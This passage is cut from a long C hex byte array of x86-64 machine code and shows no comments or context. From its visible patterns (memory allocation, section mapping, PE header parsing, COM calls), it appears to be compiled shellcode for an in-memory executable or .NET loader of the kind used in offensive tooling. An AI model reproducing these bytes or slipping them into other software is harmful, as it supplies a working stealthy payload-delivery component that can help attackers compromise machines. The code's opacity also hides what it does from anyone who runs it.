0x0e, 0x48, 0x8d, 0x97, 0xa0, 0x08, 0x00, 0x00, 0x4c, 0x8d, 0x46, 0x20, \n  0x48, 0x8b, 0x01, 0xff, 0x10, 0x85, 0xc0, 0x0f, 0x88, 0x9d, 0x00, 0x00, \n  0x00, 0x8b, 0x85, 0x24, 0x05, 0x00, 0x00, 0x4c, 0x8d, 0x84, 0x24, 0x78, \n  0x02, 0x00, 0x00, 0x44, 0x21, 0xa4, 0x24, 0x7c, 0x02, 0x00, 0x00, 0xb9, \n  0x11, 0x00, 0x00, 0x00, 0x89, 0x84, 0x24, 0x78, 0x02, 0x00, 0x00, 0x8d, \n  0x51, 0xf0, 0xff, 0x97, 0x00, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xd8, 0x48, \n  0x85, 0xc0, 0x74, 0x6a, 0x4c, 0x8b, 0x43, 0x10, 0x33, 0xc0, 0x39, 0x85, \n  0x24, 0x05, 0x00, 0x00, 0x76, 0x15, 0x8a, 0x8c, 0x28, 0x28, 0x05, 0x00, \n  0x00, 0x42, 0x88, 0x0c, 0x00, 0xff, 0xc0, 0x3b, 0x85, 0x24, 0x05, 0x00, \n  0x00, 0x72, 0xeb, 0x48, 0x8b, 0x4e, 0x20, 0x4c, 0x8d, 0x46, 0x28, 0x48, \n  0x8b, 0xd3, 0x48, 0x8b, 0x01, 0xff, 0x90, 0x68, 0x01, 0x00, 0x00, 0x85, \n  0xc0, 0x48, 0x8b, 0x43, 0x10, 0x41, 0x0f, 0x94, 0xc4, 0x33, 0xd2, 0x39, \n  0x95, 0x24, 0x05, 0x00, 0x00, 0x76, 0x16, 0xc6, 0x84, 0x2a, 0x28, 0x05, \n  0x00, 0x00, 0x00, 0xc6, 0x04, 0x02, 0x00, 0xff, 0xc2, 0x3b, 0x95, 0x24, \n  0x05, 0x00, 0x00, 0x72, 0xea, 0x48, 0x8b, 0xcb, 0xff, 0x97, 0x18, 0x01, \n  0x00, 0x00, 0x41, 0x8b, 0xc4, 0x4c, 0x8d, 0x9c, 0x24, 0x30, 0x02, 0x00, \n  0x00, 0x49, 0x8b, 0x5b, 0x38, 0x49, 0x8b, 0x6b, 0x40, 0x49, 0x8b, 0xe3, \n  0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5c, 0x5f, 0x5e, 0xc3, 0xcc, 0xcc, 0xcc, \n  0x48, 0x89, 0x5c, 0x24, 0x10, 0x48, 0x89, 0x6c, 0x24, 0x18, 0x56, 0x57, \n  0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0x48, 0x81, 0xec, 0x80, 0x01, 0x00, \n  0x00, 0x4c, 0x8b, 0x41, 0x28, 0x48, 0x8b, 0xd9, 0x48, 0x8b, 0x51, 0x48, \n  0xe8, 0x7f, 0x1a, 0x00, 0x00, 0x4c, 0x8b, 0x43, 0x28, 0x48, 0x8b, 0xcb, \n  0x48, 0x8b, 0x53, 0x50, 0x4c, 0x8b, 0xe0, 0xe8, 0x6c, 0x1a, 0x00, 0x00, \n  0x4c, 0x8b, 0x43, 0x28, 0x48, 0x8b, 0xcb, 0x48, 0x8b, 0x93, 0xe8, 0x01, \n  0x00, 0x00, 0x4c, 0x8b, 0xf8, 0xe8, 0x56, 0x1a, 0x00, 0x00, 0x48, 0x8b, \n  0xe8, 0x4d, 0x85, 0xe4, 0x74, 0x30, 0x4d, 0x85, 0xff, 0x74, 0x2b, 0x48, \n  0x85, 0xc0, 0x74, 0x26, 0x8b, 0x13, 0x33, 0xc9, 0x41, 0xb8, 0x00, 0x30, \n  0x00, 0x00, 0x44, 0x8d, 0x49, 0x04, 0x41, 0xff, 0xd4, 0x48, 0x8b, 0xf8, \n  0x48, 0x85, 0xc0, 0x75, 0x2c, 0x83, 0xbb, 0x30, 0x02, 0x00, 0x00, 0x02, \n  0x75, 0x04, 0x33, 0xc9, 0xff, 0xd5, 0x83, 0xc8, 0xff, 0x4c, 0x8d, 0x9c, \n  0x24, 0x80, 0x01, 0x00, 0x00, 0x49, 0x8b, 0x5b, 0x38, 0x49, 0x8b, 0x6b, \n  0x40, 0x49, 0x8b, 0xe3, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5c, 0x5f, 0x5e, \n  0xc3, 0x44, 0x8b, 0x03, 0x48, 0x8b, 0xd3, 0x48, 0x8b, 0xcf, 0xe8, 0x71, \n  0x1f, 0x00, 0x00, 0x33, 0xd2, 0x48, 0x8d, 0x4c, 0x24, 0x30, 0x44, 0x8d, \n  0x42, 0x40, 0xe8, 0x81, 0x1f, 0x00, 0x00, 0x83, 0xbf, 0x34, 0x02, 0x00, \n  0x00, 0x03, 0x4c, 0x8d, 0x77, 0x28, 0x75, 0x3a, 0x44, 0x8b, 0x0f, 0x4c, \n  0x8d, 0x87, 0x3c, 0x02, 0x00, 0x00, 0x41, 0x81, 0xe9, 0x3c, 0x02, 0x00, \n  0x00, 0x48, 0x8d, 0x57, 0x14, 0x48, 0x8d, 0x4f, 0x04, 0xe8, 0x6a, 0x1b, \n  0x00, 0x00, 0x49, 0x8b, 0x16, 0x48, 0x8d, 0x8f, 0x2c, 0x0c, 0x00, 0x00, \n  0xe8, 0x1b, 0x1a, 0x00, 0x00, 0x48, 0x3b, 0x87, 0x30, 0x0d, 0x00, 0x00, \n  0x0f, 0x85, 0x55, 0x02, 0x00, 0x00, 0x4d, 0x8b, 0x06, 0x48, 0x8b, 0xcf, \n  0x48, 0x8b, 0x57, 0x30, 0xe8, 0x8b, 0x19, 0x00, 0x00, 0x48, 0x89, 0x47, \n  0x30, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0x60, 0xff, 0xff, 0xff, 0x48, 0x8d, \n  0x9f, 0x40, 0x02, 0x00, 0x00, 0x8a, 0x03, 0x33, 0xd2, 0x84, 0xc0, 0x74, \n  0x3b, 0x33, 0xc9, 0x3c, 0x3b, 0x74, 0x17, 0x81, 0xfa, 0x04, 0x01, 0x00, \n  0x00, 0x73, 0x0f, 0xff, 0xc2, 0x88, 0x44, 0x0c, 0x70, 0x8b, 0xca, 0x8a, \n  0x04, 0x1a, 0x84, 0xc0, 0x75, 0xe5, 0x85, 0xd2, 0x74, 0x1a, 0x8d, 0x4a, \n  0x01, 0xc6, 0x44, 0x14, 0x70, 0x00, 0x48, 0x03, 0xd9, 0x48, 0x8d, 0x54, \n  0x24, 0x70, 0x48, 0x8b, 0xcf, 0xe8, 0xa6, 0x16, 0x00, 0x00, 0xeb, 0xbd, \n  0xbe, 0x01, 0x00, 0x00, 0x00, 0x39, 0xb7, 0x3c, 0x02, 0x00, 0x00, 0x76, \n  0x33, 0x4d, 0x8b, 0x06, 0x48, 0x8b, 0xcf, 0x8b, 0xde, 0x48, 0x8b, 0x54, \n  0xdf, 0x30, 0xe8, 0x15, 0x19, 0x00, 0x00, 0x48, 0x89, 0x44, 0xdf, 0x30, \n  0x48, 0x85, 0xc0, 0x75, 0x0d, 0x48, 0x39, 0x87, 0xa0, 0x01, 0x00, 0x00, \n  0x0f, 0x85, 0xb9, 0x01, 0x00, 0x00, 0xff, 0xc6, 0x3b, 0xb7, 0x3c, 0x02, \n  0x00, 0x00, 0x72, 0xcd, 0x8b, 0x87, 0x20, 0x09, 0x00, 0x00, 0x83, 0xf8, \n  0x02, 0x75, 0x1f, 0x48, 0x8b, 0xcf, 0xe8, 0x5d, 0xef, 0xff, 0xff, 0x41, \n  0xbe, 0x01, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, 0x94, 0x01, 0x00, \n  0x00, 0x48, 0x8b, 0x9f, 0x60, 0x0d, 0x00, 0x00, 0xeb, 0x23, 0x41, 0xbe, \n  0x01, 0x00, 0x00, 0x00, 0x83, 0xf8, 0x03, 0x0f, 0x84, 0x7c, 0x01, 0x00, \n  0x00, 0x48, 0x8d, 0x9f, 0x60, 0x0d, 0x00, 0x00, 0x41, 0x3b, 0xc6, 0x74, \n  0x08, 0x48, 0x8b, 0x9c, 0x24, 0xb0, 0x01, 0x00, 0x00, 0x44, 0x39, 0xb7, \n  0x70, 0x05, 0x00, 0x00, 0x74, 0x32, 0x48, 0x8b, 0xcf, 0xe8, 0x56, 0xed, \n  0xff, 0xff, 0x85, 0xc0, 0x75, 0x0d, 0x83, 0xbf, 0x70, 0x05, 0x00, 0x00, \n  0x02, 0x0f, 0x84, 0x46, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xcf, 0xe8, 0x69, \n  0xee, 0xff, 0xff, 0x85, 0xc0, 0x75, 0x0d, 0x83, 0xbf, 0x70, 0x05, 0x00, \n  0x00, 0x02, 0x0f, 0x84, 0x2d, 0x01, 0x00, 0x00, 0x44, 0x39, 0x73, 0x08, \n  0x0f, 0x84, 0xad, 0x00, 0x00, 0x00, 0x8b, 0x93, 0x24, 0x05, 0x00, 0x00, \n  0x33, 0xc9, 0x48, 0x81, 0xc2, 0x2f, 0x15, 0x00, 0x00, 0x41, 0xb8, 0x00, \n  0x30, 0x00, 0x00, 0x48, 0x81, 0xe2, 0x00, 0xf0, 0xff, 0xff, 0x44, 0x8d, \n  0x49, 0x04, 0x41, 0xff, 0xd4, 0x48, 0x8b, 0xf0, 0x48, 0x85, 0xc0, 0x0f, \n  0x84, 0xf4, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x30, 0x05, 0x00, 0x00, 0x48, \n  0x8b, 0xd3, 0x48, 0x8b, 0xc8, 0xe8, 0xa2, 0x1d, 0x00, 0x00, 0x8b, 0x43, \n  0x08, 0x8d, 0x48, 0xfd, 0x41, 0x3b, 0xce, 0x76, 0x1a, 0x83, 0xf8, 0x02, \n  0x75, 0x5d, 0x48, 0x8d, 0x96, 0x28, 0x05, 0x00, 0x00, 0x48, 0x8d, 0x8b, \n  0x28, 0x05, 0x00, 0x00, 0xe8, 0x03, 0x1b, 0x00, 0x00, 0xeb, 0x45, 0x44, \n  0x8b, 0x83, 0x24, 0x05, 0x00, 0x00, 0x4c, 0x8d, 0x8b, 0x28, 0x05, 0x00, \n  0x00, 0x0f, 0xb7, 0xc8, 0x48, 0x8d, 0x96, 0x28, 0x05, 0x00, 0x00, 0x66, \n  0x41, 0x2b, 0xce, 0xb8, 0x00, 0x01, 0x00, 0x00, 0x66, 0x0b, 0xc8, 0x48, \n  0x8d, 0x84, 0x24, 0xb0, 0x01, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x28, \n  0x8b, 0x83, 0x20, 0x05, 0x00, 0x00, 0x89, 0x44, 0x24, 0x20, 0xff, 0x97, \n  0x00, 0x02, 0x00, 0x00, 0x85, 0xc0, 0x75, 0x79, 0x48, 0x8b, 0xde, 0x8b, \n  0x0b, 0x8d, 0x41, 0xfd, 0x41, 0x3b, 0xc6, 0x76, 0x50, 0x8d, 0x41, 0xff, \n  0x41, 0x3b, 0xc6, 0x76, 0x15, 0x8d, 0x41, 0xfb, 0x41, 0x3b, 0xc6, 0x77, \n  0x4b, 0x48, 0x8b, 0xd3, 0x48, 0x8b, 0xcf, 0xe8, 0xa8, 0x0f, 0x00, 0x00, \n  0xeb, 0x3e, 0x4c, 0x8d, 0x44, 0x24, 0x30, 0x48, 0x8b, 0xd3, 0x48, 0x8b, \n  0xcf, 0xe8, 0x62, 0xfa, 0xff, 0xff, 0x85, 0xc0, 0x74, 0x10, 0x4c, 0x8d, \n  0x44, 0x24, 0x30, 0x48, 0x8b, 0xd3, 0x48, 0x8b, 0xcf, 0xe8, 0x9e, 0x00, \n  0x00, 0x00, 0x48, 0x8d, 0x54, 0x24, 0x30, 0x48, 0x8b, 0xcf, 0xe8, 0xd1, \n  0xf4, 0xff, 0xff, 0xeb, 0x0b, 0x48, 0x8b, 0xd3, 0x48, 0x8b, 0xcf, 0xe8, \n  0xb4, 0x04, 0x00, 0x00, 0x83, 0xbf, 0x30, 0x02, 0x00, 0x00, 0x03, 0x75, \n  0x08, 0xeb, 0xfe, 0x41, 0xbe, 0x01, 0x00, 0x00, 0x00, 0x8b, 0x87, 0x20, \n  0x09, 0x00, 0x00, 0xbe, 0x00, 0xc0, 0x00, 0x00, 0x83, 0xe8, 0x02, 0x41, \n  0x3b, 0xc6, 0x77, 0x31, 0x48, 0x8b, 0x8f, 0x60, 0x0d, 0x00, 0x00, 0x48, \n  0x85, 0xc9, 0x74, 0x25, 0x44, 0x8b, 0x87, 0x58, 0x0d, 0x00, 0x00, 0x33, \n  0xd2, 0xe8, 0xb2, 0x1c, 0x00, 0x00, 0x48, 0x8b, 0x8f, 0x60, 0x0d, 0x00, \n  0x00, 0x44, 0x8b, 0xc6, 0x33, 0xd2, 0x41, 0xff, 0xd7, 0x48, 0x83, 0xa7, \n  0x60, 0x0d, 0x00, 0x00, 0x00, 0x44, 0x8b, 0x07, 0x33, 0xd2, 0x8b, 0x9f, \n  0x30, 0x02, 0x00, 0x00, 0x48, 0x8b, 0xcf, 0xe8, 0x88, 0x1c, 0x00, 0x00, \n  0x44, 0x8b, 0xc6, 0x33, 0xd2, 0x48, 0x8b, 0xcf, 0x41, 0xff, 0xd7, 0x83, \n  0xfb, 0x02, 0x75, 0x04, 0x33, 0xc9, 0xff, 0xd5, 0x33, 0xc0, 0xe9, 0xb2, \n  0xfc, 0xff, 0xff, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x08, 0x55, 0x56, 0x57, \n  0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0xac, 0x24, \n  0xe0, 0xfd, 0xff, 0xff, 0x48, 0x81, 0xec, 0x20, 0x03, 0x00, 0x00, 0x45, \n  0x33, 0xed, 0x33, 0xc0, 0x83, 0x3a, 0x02, 0x0f, 0x57, 0xc0, 0x4d, 0x8b, \n  0xf0, 0x4c, 0x89, 0x6c, 0x24, 0x50, 0x48, 0x8b, 0xf2, 0x48, 0x89, 0x45, \n  0x88, 0x45, 0x8d, 0x7d, 0x01, 0x66, 0x44, 0x89, 0xad, 0x68, 0x02, 0x00, \n  0x00, 0x48, 0x8b, 0xd9, 0x41, 0x8b, 0xfd, 0x0f, 0x11, 0x44, 0x24, 0x78, \n  0x0f, 0x85, 0xf0, 0x01, 0x00, 0x00, 0x49, 0x8b, 0x48, 0x28, 0x49, 0x8d, \n  0x50, 0x38, 0x48, 0x8b, 0x01, 0xff, 0x90, 0x80, 0x00, 0x00, 0x00, 0x85, \n  0xc0, 0x0f, 0x88, 0xce, 0x01, 0x00, 0x00, 0x49, 0x8b, 0x4e, 0x38, 0x48, \n  0x8d, 0x54, 0x24, 0x50, 0x48, 0x8b, 0x01, 0xff, 0x90, 0x90, 0x00, 0x00, \n  0x00, 0x85, 0xc0, 0x0f, 0x88, 0x86, 0x03, 0x00, 0x00, 0x48, 0x8b, 0x4c, \n  0x24, 0x50, 0x4c, 0x8d, 0x44, 0x24, 0x48, 0x41, 0x8b, 0xd7, 0xff, 0x93, \n  0x20, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x4c, 0x24, 0x50, 0x4c, 0x8d, 0x44, \n  0x24, 0x44, 0x41, 0x8b, 0xd7, 0xff, 0x93, 0x28, 0x01, 0x00, 0x00, 0x8b, \n  0x44, 0x24, 0x44, 0x2b, 0x44, 0x24, 0x48, 0x41, 0x03, 0xc7, 0x0f, 0x84, \n  0x26, 0x01, 0x00, 0x00, 0x41, 0x8d, 0x4d, 0x0c, 0x45, 0x8b, 0xc7, 0x33, \n  0xd2, 0xff, 0x93, 0x08, 0x01, 0x00, 0x00, 0x4c, 0x8d, 0x86, 0x0c, 0x04, \n  0x00, 0x00, 0x33, 0xd2, 0x48, 0x8b, 0xf8, 0x45, 0x38, 0x28, 0x0f, 0x84, \n  0xa0, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x45, 0x10, 0x41, 0xbf, 0x00, 0x01, \n  0x00, 0x00, 0x44, 0x89, 0x7c, 0x24, 0x28, 0x41, 0x83, 0xc9, 0xff, 0x33, \n  0xc9, 0x48, 0x89, 0x44, 0x24, 0x20, 0xff, 0x53, 0x70, 0x48, 0x8d, 0x54, \n  0x24, 0x40, 0x48, 0x8d, 0x4d, 0x10, 0xff, 0x93, 0xf8, 0x00, 0x00, 0x00, \n  0x44, 0x8b, 0x44, 0x24, 0x40, 0xb9, 0x08, 0x20, 0x00, 0x00, 0x66, 0x89, \n  0x4c, 0x24, 0x60, 0x33, 0xd2, 0x41, 0x8d, 0x4d, 0x08, 0x4c, 0x8b, 0xf8, \n  0xff, 0x93, 0x08, 0x01, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x68, 0x44, \n  0x89, 0xad, 0x78, 0x02, 0x00, 0x00, 0x44, 0x39, 0x6c, 0x24, 0x40, 0x76, \n  0x3b, 0x41, 0x8b, 0xcd, 0x45, 0x8d, 0x65, 0x01, 0x49, 0x8b, 0x0c, 0xcf, \n  0xff, 0x93, 0x30, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x4c, 0x24, 0x68, 0x48, \n  0x8d, 0x95, 0x78, 0x02, 0x00, 0x00, 0x4c, 0x8b, 0xc0, 0xff, 0x93, 0x10, \n  0x01, 0x00, 0x00, 0x8b, 0x8d, 0x78, 0x02, 0x00, 0x00, 0x41, 0x03, 0xcc, \n  0x89, 0x8d, 0x78, 0x02, 0x00, 0x00, 0x3b, 0x4c, 0x24, 0x40, 0x72, 0xcc, \n  0x41, 0xbf, 0x01, 0x00, 0x00, 0x00, 0xeb, 0x46, 0xb9, 0x08, 0x20, 0x00, \n  0x00, 0x45, 0x8b, 0xc7, 0x66, 0x89, 0x4c, 0x24, 0x60, 0xb9, 0x08, 0x00, \n  0x00, 0x00, 0xff, 0x93, 0x08, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x68, \n  0x02, 0x00, 0x00, 0x44, 0x89, 0xad, 0x78, 0x02, 0x00, 0x00, 0x48, 0x89, \n  0x44, 0x24, 0x68, 0xff, 0x93, 0x30, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x4c, \n  0x24, 0x68, 0x48, 0x8d, 0x95, 0x78, 0x02, 0x00, 0x00, 0x4c, 0x8b, 0xc0, \n  0xff, 0x93, 0x10, 0x01, 0x00, 0x00, 0x4c, 0x8d, 0x44, 0x24, 0x60, 0x44, \n  0x89, 0xad, 0x78, 0x02, 0x00, 0x00, 0x48, 0x8d, 0x95, 0x78, 0x02, 0x00, \n  0x00, 0x48, 0x8b, 0xcf, 0xff, 0x93, 0x10, 0x01, 0x00, 0x00, 0x49, 0x8b, \n  0x4e, 0x38, 0x4c, 0x8d, 0x4d, 0xd8, 0xf2, 0x0f, 0x10, 0x4d, 0x88, 0x48, \n  0x8d, 0x55, 0xa0, 0x66, 0x44, 0x89, 0x7c, 0x24, 0x78, 0x4c, 0x8b, 0xc7, \n  0x4c, 0x89, 0x6d, 0x80, 0x0f, 0x10, 0x44, 0x24, 0x78, 0x48, 0x8b, 0x01, \n  0xf2, 0x0f, 0x11, 0x4d, 0xb0, 0x0f, 0x29, 0x45, 0xa0, 0xff, 0x90, 0x28, \n  0x01, 0x00, 0x00, 0x48, 0x85, 0xff, 0x0f, 0x84, 0xeb, 0x01, 0x00, 0x00, \n  0x48, 0x8b, 0x4c, 0x24, 0x68, 0xff, 0x93, 0x18, 0x01, 0x00, 0x00, 0x48, \n  0x8b, 0xcf, 0xff, 0x93, 0x18, 0x01, 0x00, 0x00, 0xe9, 0xd2, 0x01, 0x00, \n  0x00, 0x4d, 0x89, 0x6e, 0x38, 0xe9, 0xc9, 0x01, 0x00, 0x00, 0x4c, 0x8d, \n  0x82, 0x0c, 0x02, 0x00, 0x00, 0x41, 0xbf, 0x00, 0x01, 0x00, 0x00, 0x48, \n  0x8d, 0x45, 0x10, 0x44, 0x89, 0x7c, 0x24, 0x28, 0x41, 0x83, 0xcc, 0xff, \n  0x48, 0x89, 0x44, 0x24, 0x20, 0x45, 0x8b, 0xcc, 0x33, 0xd2, 0x33, 0xc9, \n  0xff, 0x53, 0x70, 0x48, 0x8d, 0x4d, 0x10, 0xff, 0x93, 0x30, 0x01, 0x00, \n  0x00, 0x48, 0x89, 0x44, 0x24, 0x58, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, \n  0x0f, 0x84, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x45, 0x10, 0x44, 0x89, \n  0x7c, 0x24, 0x28, 0x4c, 0x8d, 0x86, 0x0c, 0x03, 0x00, 0x00, 0x48, 0x89, \n  0x44, 0x24, 0x20, 0x45, 0x8b, 0xcc, 0x33, 0xd2, 0x33, 0xc9, 0xff, 0x53, \n  0x70, 0x48, 0x8d, 0x4d, 0x10, 0xff, 0x93, 0x30, 0x01, 0x00, 0x00, 0x4c, \n  0x8b, 0xe8, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0x41, 0x01, 0x00, 0x00, 0x49, \n  0x8b, 0x4e, 0x28, 0x49, 0x8d, 0x46, 0x30, 0x4c, 0x8b, 0xc0, 0x48, 0x89, \n  0x45, 0x90, 0x48, 0x8b, 0xd7, 0x4c, 0x8b, 0x09, 0x41, 0xff, 0x91, 0x88, \n  0x00, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x88, 0x14, 0x01, 0x00, 0x00, 0x33, \n  0xff, 0x4c, 0x8d, 0x86, 0x0c, 0x04, 0x00, 0x00, 0x41, 0x38, 0x38, 0x0f, \n  0x84, 0xab, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x45, 0x10, 0x44, 0x89, 0x7c, \n  0x24, 0x28, 0x45, 0x8b, 0xcc, 0x48, 0x89, 0x44, 0x24, 0x20, 0x33, 0xd2, \n  0x33, 0xc9, 0xff, 0x53, 0x70, 0x48, 0x8d, 0x54, 0x24, 0x40, 0x48, 0x8d, \n  0x4d, 0x10, 0xff, 0x93, 0xf8, 0x00, 0x00, 0x00, 0x44, 0x8b, 0x44, 0x24, \n  0x40, 0x8d, 0x4f, 0x0c, 0x33, 0xd2, 0x4c, 0x8b, 0xf8, 0xff, 0x93, 0x08, \n  0x01, 0x00, 0x00, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x74, 0x69, 0x83, \n  0xa5, 0x78, 0x02, 0x00, 0x00, 0x00, 0x83, 0x7c, 0x24, 0x40, 0x00, 0x76, \n  0x5b, 0x33, 0xc9, 0x8d, 0x71, 0x08, 0x44, 0x8d, 0x61, 0x01, 0x49, 0x8b, \n  0x0c, 0xcf, 0xff, 0x93, 0x30, 0x01, 0x00, 0x00, 0x4c, 0x8d, 0x45, 0xc0, \n  0x66, 0x89, 0x75, 0xc0, 0x48, 0x8d, 0x95, 0x78, 0x02, 0x00, 0x00, 0x48, \n  0x89, 0x45, 0xc8, 0x48, 0x8b, 0xcf, 0xff, 0x93, 0x10, 0x01, 0x00, 0x00, \n  0x44, 0x8b, 0xf0, 0x85, 0xc0, 0x79, 0x0b, 0x48, 0x8b, 0xcf, 0xff, 0x93, \n  0x18, 0x01, 0x00, 0x00, 0x33, 0xff, 0x8b, 0x8d, 0x78, 0x02, 0x00, 0x00, \n  0x41, 0x03, 0xcc, 0x89, 0x8d, 0x78, 0x02, 0x00, 0x00, 0x3b, 0x4c, 0x24, \n  0x40, 0x72, 0xb3, 0x45, 0x85, 0xf6, 0x78, 0x52, 0x48, 0x8b, 0x4d, 0x90, \n  0x48, 0x8d, 0x55, 0xf0, 0x48, 0x89, 0x54, 0x24, 0x30, 0x0f, 0x57, 0xc0, \n  0x48, 0x8d, 0x55, 0xa0, 0x0f, 0x29, 0x45, 0xa0, 0xf2, 0x0f, 0x10, 0x45, \n  0x88, 0x45, 0x33, 0xc9, 0x48, 0x8b, 0x09, 0x41, 0xb8, 0x18, 0x01, 0x00, \n  0x00, 0x48, 0x89, 0x7c, 0x24, 0x28, 0x48, 0x89, 0x54, 0x24, 0x20, 0x49, \n  0x8b, 0xd5, 0xf2, 0x0f, 0x11, 0x45, 0xb0, 0x48, 0x8b, 0x01, 0xff, 0x90, \n  0xc8, 0x01, 0x00, 0x00, 0x48, 0x85, 0xff, 0x74, 0x09, 0x48, 0x8b, 0xcf, \n  0xff, 0x93, 0x18, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x7c, 0x24, 0x58, 0x49, \n  0x8b, 0xcd, 0xff, 0x93, 0x38, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xcf, 0xff, \n  0x93, 0x38, 0x01, 0x00, 0x00, 0x41, 0xbf, 0x01, 0x00, 0x00, 0x00, 0x41, \n  0x8b, 0xc7, 0x48, 0x8b, 0x9c, 0x24, 0x60, 0x03, 0x00, 0x00, 0x48, 0x81, \n  0xc4, 0x20, 0x03, 0x00, 0x00, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, \n  0x5c, 0x5f, 0x5e, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x54, 0x24, \n  0x10, 0x55, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, \n  0x57, 0x48, 0x8d, 0xac, 0x24, 0x38, 0xfd, 0xff, 0xff, 0x48, 0x81, 0xec, \n  0xc8, 0x03, 0x00, 0x00, 0x4c, 0x8d, 0xba, 0x28, 0x05, 0x00, 0x00, 0x33, \n  0xff, 0x4d, 0x63, 0x77, 0x3c, 0x48, 0x8b, 0xf1, 0x4d, 0x03, 0xf7, 0x48, \n  0x89, 0x7c, 0x24, 0x60, 0x33, 0xc9, 0x4c, 0x89, 0x75, 0x88, 0x4c, 0x8b, \n  0xea, 0x48, 0x89, 0xbd, 0x28, 0x03, 0x00, 0x00, 0x48, 0x89, 0x7c, 0x24, \n  0x50, 0x4c, 0x89, 0x7d, 0x80, 0xff, 0x56, 0x40, 0x48, 0x8b, 0xc8, 0x48, \n  0x63, 0x40, 0x3c, 0x0f, 0xb7, 0x4c, 0x08, 0x04, 0x66, 0x41, 0x39, 0x4e, \n  0x04, 0x0f, 0x85, 0x0f, 0x09, 0x00, 0x00, 0x41, 0x8b, 0x46, 0x50, 0x48, \n  0x89, 0x45, 0x98, 0x41, 0x8b, 0x86, 0xb4, 0x00, 0x00, 0x00, 0x89, 0x85, \n  0x20, 0x03, 0x00, 0x00, 0x85, 0xc0, 0x75, 0x0b, 0x49, 0x8b, 0x46, 0x30, \n  0x48, 0x89, 0x85, 0x28, 0x03, 0x00, 0x00, 0xb9, 0x03, 0x00, 0x00, 0x00, \n  0x48, 0x89, 0x7c, 0x24, 0x30, 0x48, 0x8d, 0x9e, 0x25, 0x06, 0x00, 0x00, \n  0x8d, 0x41, 0xfe, 0x44, 0x8d, 0x61, 0xff, 0x40, 0x38, 0x3b, 0x75, 0x34, \n  0xc7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x08, 0x4c, 0x8d, 0x4d, 0x98, \n  0x45, 0x33, 0xc0, 0xc7, 0x44, 0x24, 0x20, 0x40, 0x00, 0x00, 0x00, 0xba, \n  0x1f, 0x00, 0x0f, 0x00, 0x48, 0x8d, 0x4c, 0x24, 0x68, 0xff, 0x96, 0x10, \n  0x02, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x85, 0x9f, 0x08, 0x00, 0x00, 0xe9, \n  0x9b, 0x00, 0x00, 0x00, 0x89, 0x7c, 0x24, 0x28, 0x45, 0x33, 0xc9, 0x89, \n  0x4c, 0x24, 0x20, 0x44, 0x8b, 0xc0, 0x48, 0x8b, 0xcb, 0xba, 0x00, 0x00, \n  0x00, 0x80, 0xff, 0x96, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xf8, 0x48, \n  0xff, 0xc8, 0x48, 0x83, 0xf8, 0xfd, 0x0f, 0x87, 0x6e, 0x08, 0x00, 0x00, \n  0x33, 0xdb, 0x48, 0x8d, 0x54, 0x24, 0x58, 0x48, 0x8b, 0xcf, 0x48, 0x89, \n  0x5c, 0x24, 0x58, 0xff, 0x96, 0x98, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x0f, \n  0x84, 0x51, 0x08, 0x00, 0x00, 0x8b, 0x44, 0x24, 0x58, 0x41, 0x39, 0x46, \n  0x50, 0x0f, 0x87, 0x43, 0x08, 0x00, 0x00, 0x48, 0x89, 0x7c, 0x24, 0x30, \n  0x48, 0x8d, 0x4c, 0x24, 0x68, 0xc7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, \n  0x01, 0x45, 0x33, 0xc9, 0x45, 0x33, 0xc0, 0x44, 0x89, 0x64, 0x24, 0x20, \n  0xba, 0x1f, 0x00, 0x0f, 0x00, 0xff, 0x96, 0x10, 0x02, 0x00, 0x00, 0x48, \n  0x8b, 0xcf, 0x8b, 0xd8, 0xff, 0x96, 0xf0, 0x00, 0x00, 0x00, 0x33, 0xff, \n  0x85, 0xdb, 0x0f, 0x85, 0x06, 0x08, 0x00, 0x00, 0x48, 0x8d, 0x9e, 0x25, \n  0x06, 0x00, 0x00, 0xff, 0x96, 0xb0, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x4c, \n  0x24, 0x68, 0x4c, 0x8d, 0x85, 0x28, 0x03, 0x00, 0x00, 0xc7, 0x44, 0x24, \n  0x48, 0x04, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xd0, 0x89, 0x7c, 0x24, 0x40, \n  0x48, 0x8d, 0x44, 0x24, 0x50, 0x44, 0x89, 0x64, 0x24, 0x38, 0x45, 0x33, \n  0xc9, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x89, 0x7c, 0x24, 0x28, 0x48, \n  0x89, 0x7c, 0x24, 0x20, 0xff, 0x96, 0x18, 0x02, 0x00, 0x00, 0x48, 0x8b, \n  0x8d, 0x28, 0x03, 0x00, 0x00, 0x4d, 0x63, 0x67, 0x3c, 0x4c, 0x03, 0xe1, 